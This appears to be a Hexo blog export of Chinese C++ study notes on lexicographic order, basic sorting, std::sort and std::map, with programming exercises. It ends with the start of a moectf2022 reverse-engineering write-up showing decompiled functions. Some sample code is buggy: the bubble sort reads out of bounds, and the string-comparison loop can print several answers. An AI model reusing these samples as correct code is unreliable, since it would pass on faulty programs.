class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="字典序"><a href="#字典序" class="headerlink" title="字典序"></a>字典序</h1><h2 id="printf"><a href="#printf" class="headerlink" title="printf()"></a>printf()</h2><p>printf并不能直接处理string类型的变量，只能处理字符数组，在输出的时候要用c_str()做一个转换</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	string b=<span class="string">&quot;ajhk&quot;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, b.<span class="built_in">c_str</span>());</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="数组的字典序"><a href="#数组的字典序" class="headerlink" title="数组的字典序"></a>数组的字典序</h2><p>从两个数组的第一个值开始比较，一旦出现不相等，便可以按照那一位的大小判断整个数组的大小，如果没有，比较数组长度</p>
<h2 id="字符转义"><a href="#字符转义" class="headerlink" title="字符转义"></a>字符转义</h2><p>字符串赋值时，用一对双引号表示赋值的内容，如：s&#x3D;”hello world”，如果希望s的值里包括双引号这个字符，则需要进行转义处理</p>
<p>s&#x3D;”I’m &quot;ajkhdskjad”</p>
<h2 id="按照字典序定义，比较字符串大小"><a href="#按照字典序定义，比较字符串大小" class="headerlink" title="按照字典序定义，比较字符串大小"></a>按照字典序定义，比较字符串大小</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	string str1, str2;</span><br><span class="line">	cin &gt;&gt; str1;</span><br><span class="line">	cin &gt;&gt; str2;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">min</span>(str1.<span class="built_in">length</span>(), str2.<span class="built_in">length</span>()); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (str1[i] &lt; str2[i])</span><br><span class="line">		&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (str1[i] &gt; str2[i])</span><br><span class="line">		&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (str1.<span class="built_in">length</span>() &lt; str2.<span class="built_in">length</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="地外遗迹"><a href="#地外遗迹" class="headerlink" title="地外遗迹"></a>地外遗迹</h2><p>你的朋友琼斯是一个星际冒险家，你知道的，星际冒险家总是会遇见一些奇怪的情况。今天琼斯发了一个信息向你求助。</p>
<p>琼斯在距离地球不远的星球上发现了一座远古遗迹，远古遗迹的大门上有着奇怪的机关。琼斯通过一段时间的摸索结合他的冒险经验得出了一个结论：机关的屏幕上每次会出现两个单词，如果第一个单词的字典序小于第二个单词的字典序，就需要按下绿色的按钮；反之则按下红色的按钮。</p>
<p>有一个<strong>额外</strong>的问题需要注意。因为遗迹的年代久远，遗迹主人所使用的的语言<strong>与我们的语言的字典序有一些差别</strong>。当然，见多识广的琼斯肯定是了解这些差别的，他会告诉你正确的字典序。那么你能帮他写一个程序解开大门的机关么？</p>
<p>PS: 单词只包含小写字母</p>
<p>例如： uvwxyzabcdefghijklmnopqrst</p>
<p>表示，在遗迹语言中， u是字典序最小的，而 t 是字典序最大的。按照他们的字典序来排， u 排在 a 的前面。</p>
<h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行，一个长度为 26 的小写字母的字符串（就是琼斯告诉你的字典序，字母越前字典序越小，不会出现重复的小写字母）<br>第二行，一个数字 n ，表示后面需要进行 n 次比较（ 1≤n≤100000 ）<br>之后的 n 行，每行两个单词，中间用空格隔开</p>
<h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>如果输入的两个单词，按照遗迹的字典序，第一个单词的字典序小于第二个单词的字典序，输出 “ green ”，否则输出 “ red ”。</p>
<h4 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例"></a>输入样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uvwxyzabcdefghijklmnopqrst</span><br><span class="line">5</span><br><span class="line">apple banana</span><br><span class="line">banana blueberry</span><br><span class="line">apple watermelon</span><br><span class="line">vegetable banana</span><br><span class="line">apple ap</span><br></pre></td></tr></table></figure>

<h4 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例"></a>输出样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">green</span><br><span class="line">green</span><br><span class="line">red</span><br><span class="line">green</span><br><span class="line">red</span><br></pre></td></tr></table></figure>

<p>思路：可以把2个单词转为正常字典序下的单词，然后直接进行比较</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string table, rTable, a, b;</span><br><span class="line"><span class="function">string <span class="title">replace</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">		s[i] = rTable[s[i] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	cin &gt;&gt; table &gt;&gt; n;</span><br><span class="line">	rTable = table;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123;</span><br><span class="line">		rTable[table[i] - <span class="string">&#x27;a&#x27;</span>] = (<span class="type">char</span>)(<span class="string">&#x27;a&#x27;</span> + i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">		a = <span class="built_in">replace</span>(a);</span><br><span class="line">		b = <span class="built_in">replace</span>(b);</span><br><span class="line">		<span class="keyword">if</span> (a &lt; b)</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;green&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;red&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="基础排序"><a href="#基础排序" class="headerlink" title="基础排序"></a>基础排序</h1><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><p>Selection sort是一种简单直观的排序算法。原理：第一次从待排序的数据元素中选出最小（最大）的一个元素，存放在序列的起始位置，然后再从剩余的未排序元素中寻找到最小（大）元素，然后放到已排序的序列的末尾。以此类推，直到全部待排序的数据元素的个数为零。选择排序是不稳定的排序方法。</p>
<h3 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)  </span><br><span class="line">     &#123;</span><br><span class="line">         <span class="type">int</span> minIndex = i;</span><br><span class="line">         <span class="keyword">for</span>(<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; n; j++)</span><br><span class="line">             <span class="keyword">if</span>(nums[j] &lt; nums[minIndex])</span><br><span class="line">                 minIndex = j;</span><br><span class="line">         <span class="comment">//交换当前和最小</span></span><br><span class="line">         <span class="type">int</span> t = nums[minIndex];</span><br><span class="line">         nums[minIndex] = nums[i];</span><br><span class="line">         nums[i] = t;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><p>Bubble Sort，是一种计算机科学领域的较简单的排序算法。</p>
<p>它重复地走访过要排序的元素列，依次比较两个相邻的元素，如果顺序错误就把他们交换过来。走访元素的工作是重复地进行直到没有相邻元素需要交换，也就是说该元素列已经排序完成。</p>
<p>这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端（升序或降序排列），就如同碳酸饮料中二氧化碳的气泡最终会上浮到顶端一样，故名“冒泡排序”。</p>
<h3 id="算法实现-1"><a href="#算法实现-1" class="headerlink" title="算法实现"></a>算法实现</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[j]&lt;nums[j<span class="number">-1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> t=nums[j];</span><br><span class="line">                nums[j]=nums[j<span class="number">-1</span>];</span><br><span class="line">                nums[j<span class="number">-1</span>]=t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>冒泡排序中，交换数字次数等于逆序数</p>
<h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><p>基本思想：每步将一个待排序的数，按值的大小插入前面已经排序的数组中的适当位置上，直到全部插入完为止。</p>
<h3 id="算法实现-2"><a href="#算法实现-2" class="headerlink" title="算法实现"></a>算法实现</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++)  </span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">for</span>(<span class="type">int</span> j = i; j &gt; <span class="number">0</span>; j--)</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="comment">//如果当前的更小，则交换</span></span><br><span class="line">             <span class="keyword">if</span>(nums[j] &lt; nums[j<span class="number">-1</span>])</span><br><span class="line">             &#123;</span><br><span class="line">                 <span class="type">int</span> t = nums[j];</span><br><span class="line">                 nums[j] = nums[j - <span class="number">1</span>];</span><br><span class="line">                 nums[j - <span class="number">1</span>] = t;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="sort函数"><a href="#sort函数" class="headerlink" title="sort函数"></a>sort函数</h2><p>需要传入三个参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一个是被排序数组的起始地址。</span><br><span class="line"></span><br><span class="line">第二个是被排序数组结束地址的下一个地址， 即数组[开始, 结束]的左闭右开区间。</span><br><span class="line"></span><br><span class="line">第三个参数是数组的比较函数，就是我们规定的排序规则，可以不填， 默认不填排序规则是从小到大。</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>] = &#123; <span class="number">9</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i&lt;<span class="number">10</span>; i++) </span><br><span class="line">        cout &lt;&lt; a[i];</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">sort</span>(a, a + <span class="number">10</span>);<span class="comment">//第三个参数不用写（如果是从小到大排序的话） </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i&lt;<span class="number">10</span>; i++) </span><br><span class="line">        cout &lt;&lt; a[i];</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大到小排序</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a &gt; b;                           <span class="comment">//降序就是a &gt; b</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>] = &#123; <span class="number">9</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) cout &lt;&lt; a[i];</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">sort</span>(a, a + <span class="number">10</span>, cmp);                  <span class="comment">//指针</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) cout &lt;&lt; a[i];</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Learn</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2022/09/25/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>map</title>
    <url>/2023/01/25/map/</url>
    <content><![CDATA[<h1 id="map"><a href="#map" class="headerlink" title="map"></a>map</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>map 是 C++ 标准库的一个关联容器，是一个模板类。</p>
<p>它提供一对一（其中第一个可以称为关键字，每个关键字只能在 map 中出现一次，第二个可能称为该关键字的值）的数据处理能力，由于这个特性，它完成有可能在我们处理一对一数据的时候，在编程上提供快速通道。map 就是从键（ key ）到值（ value ）的映射。因为重载了 [ ] 运算符，map 像是数组的“高级版”。</p>
<p>这里说下 map 内部数据的组织， map 内部自建一颗红黑树(一 种非严格意义上的平衡二叉树)，当我们将不同的键值放入 map，这种数据结构会自动将所有键值变为有序的（按照键 key 排序）。所以在 map 内部所有的数据都是有序的。它的特点是增加和删除节点对迭代器的影响很小，除了那个操作节点，对其他的节点都没有什么影响。</p>
<h2 id="map功能"><a href="#map功能" class="headerlink" title="map功能"></a>map功能</h2><p>自动建立Key-value的对应。Key和value可以是任意你需要的类型</p>
<p>根据key值快速查找记录，查找的复杂度基本是log(N)</p>
<ol>
<li>快速插入 key-value 记录</li>
<li>快速删除记录。</li>
<li>根据 key 修改 value 记录</li>
<li>遍历所有记录。</li>
</ol>
<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="type">int</span>, string&gt; a;</span><br><span class="line">map&lt;<span class="type">int</span>, string&gt;::iterator it;<span class="comment">//定义一个迭代器</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	a[<span class="number">123</span>] = <span class="string">&quot;hsfjalds&quot;</span>;</span><br><span class="line">	it=a.<span class="built_in">find</span>(<span class="number">123</span>);</span><br><span class="line">	<span class="keyword">if</span> (it != a.<span class="built_in">end</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//key存在</span></span><br><span class="line">		cout &lt;&lt; a[<span class="number">123</span>] &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;NO!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="map的遍历"><a href="#map的遍历" class="headerlink" title="map的遍历"></a>map的遍历</h2><ul>
<li>迭代器</li>
<li>数组</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="type">int</span>, string&gt; a;</span><br><span class="line">map&lt;<span class="type">int</span>, string&gt;::iterator it;<span class="comment">//定义一个迭代器</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	a[<span class="number">1</span>] = <span class="string">&quot;qwe&quot;</span>;</span><br><span class="line">	a[<span class="number">2</span>] = <span class="string">&quot;asd&quot;</span>;</span><br><span class="line">	a[<span class="number">3</span>] = <span class="string">&quot;zxc&quot;</span>;</span><br><span class="line">	a[<span class="number">4</span>] = <span class="string">&quot;rty&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (it = a.<span class="built_in">begin</span>(); it != a.<span class="built_in">end</span>(); it++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; it-&gt;first &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; it-&gt;second &lt;&lt; endl;</span><br><span class="line">		<span class="comment">//first : key ，second :value</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//my_map.begin()返回的是my_map的第一个元素，而my_map.end()，返回的并不是my_map最后一个元素，而是最后一个元素后面的地址</span></span><br></pre></td></tr></table></figure>

<h2 id="其它用法"><a href="#其它用法" class="headerlink" title="其它用法"></a>其它用法</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">my_Map.<span class="built_in">size</span>() <span class="comment">//返回元素数目</span></span><br><span class="line">my_Map.<span class="built_in">empty</span>() <span class="comment">//判断是否为空</span></span><br><span class="line">my_Map.<span class="built_in">clear</span>() <span class="comment">//清空所有元素</span></span><br></pre></td></tr></table></figure>

<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="子集和判断"><a href="#子集和判断" class="headerlink" title="子集和判断"></a>子集和判断</h3><p>给出 2 个集合 A,B ，判断 B 是否为 A 的子集和。由于集合 A,B 本身都可能存在重复的元素，因此如果 B 中某个元素的数量多于 A ，也不认为 B 是 A 的子集。子集忽略集合元素的顺序。</p>
<h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>第 1 行：一个数 t ，表示测试集的数量。( 1≤t≤10)<br>每个 test 第 1 行： 2 个数 m,n 中间用空格分隔，对应集合 A,B 的大小（ 2≤m,n≤50000 ）<br>每个 test 第 2 行： m 个数，中间用空格分隔，对应集合 A 的元素。（ 1≤Ai≤50000 ）<br>每个 test 第 3 行： n 个数，中间用空格分隔，对应集合 B 的元素。（ 1≤Bi≤50000 ）</p>
<h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>共 t 行，每行输出 Yes 或 No ，如果 B 是 A 的子集，则输出 Yes，否则输出 No</p>
<h4 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例"></a>输入样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br><span class="line">3 3</span><br><span class="line">1 1 2</span><br><span class="line">1 2 1</span><br><span class="line">2 3</span><br><span class="line">1 1</span><br><span class="line">1 2 2</span><br></pre></td></tr></table></figure>

<h4 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例"></a>输出样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Yes</span><br><span class="line">No</span><br></pre></td></tr></table></figure>

<h4 id="数据范围"><a href="#数据范围" class="headerlink" title="数据范围"></a>数据范围</h4><p>共 t 行，每行输出 Yes 或 No ，如果 B 是 A 的子集，则输出 Yes，否则输出 No</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> t;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;t);</span><br><span class="line">	map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; mp;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;t;i++)&#123;</span><br><span class="line">		mp.<span class="built_in">clear</span>();</span><br><span class="line">		<span class="type">bool</span> flag=<span class="literal">false</span>;</span><br><span class="line">		<span class="type">int</span> m,n,v;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;m,&amp;n);</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;v);</span><br><span class="line">			mp[v]++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;v);</span><br><span class="line">			mp[v]--;</span><br><span class="line">			<span class="keyword">if</span>(mp[v]&lt;<span class="number">0</span>)&#123;</span><br><span class="line">				flag=<span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(flag)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Yes\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Learn</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>moectf2022 re复现</title>
    <url>/2022/12/31/moectf2022-re%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="chicken-soup"><a href="#chicken-soup" class="headerlink" title="chicken_soup"></a>chicken_soup</h1><p>主要考察去除花指令以及位移操作</p>
<img src="/2022/12/31/moectf2022-re%E5%A4%8D%E7%8E%B0/image-20221231195224393.png" class title="This is an image">

<p>跟进函数sub_401000，是一个加的操作</p>
<p>input[i] +&#x3D; input[i + 1];</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned int __cdecl sub_401000(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int result; // eax</span><br><span class="line">  unsigned int i; // [esp+18h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = strlen(a1) - 1;</span><br><span class="line">    if ( i &gt;= result )</span><br><span class="line">      break;</span><br><span class="line">    a1[i] += a1[i + 1];</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进函数sub_401080，是一个移位操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned int __cdecl sub_401080(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int result; // eax</span><br><span class="line">  unsigned int i; // [esp+18h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    if ( i &gt;= strlen(a1) )</span><br><span class="line">      break;</span><br><span class="line">    a1[i] = (16 * a1[i]) | ((int)(unsigned __int8)a1[i] &gt;&gt; 4);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp</p>
